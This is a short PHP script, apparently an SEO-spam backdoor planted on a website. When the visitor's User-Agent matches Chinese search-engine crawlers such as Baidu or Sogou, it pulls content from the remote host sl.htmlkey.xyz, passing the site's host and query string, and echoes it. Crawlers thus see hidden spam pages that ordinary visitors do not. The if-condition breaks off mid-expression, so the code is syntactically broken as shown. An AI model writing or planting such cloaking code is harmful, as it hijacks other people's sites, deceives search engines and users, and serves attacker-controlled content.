<?php
header('Content-Type:text/html;charset=gb2312');
$key= $_SERVER["HTTP_USER_AGENT"];
if(strpos($key,strtolower('HaosouSpider'))!== false||strpos($key,strtolower('baidu'))!== false||strpos($key,strtolower('Sogou'))!== false||strpos($key,strtolower('360Spider'))!== false||strpos($key,strtolower('Baiduspide'))!== 
{
date_default_timezone_set('PRC');
$TD_server = "http://sl.htmlkey.xyz/"; 
$host_name = "http://".$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
$Content_mb=file_get_contents($TD_server."/index.php?host=".$host_name."&url=".$_SERVER['QUERY_STRING']."&domain=".$_SERVER['SERVER_NAME']);

echo $Content_mb;
}
?>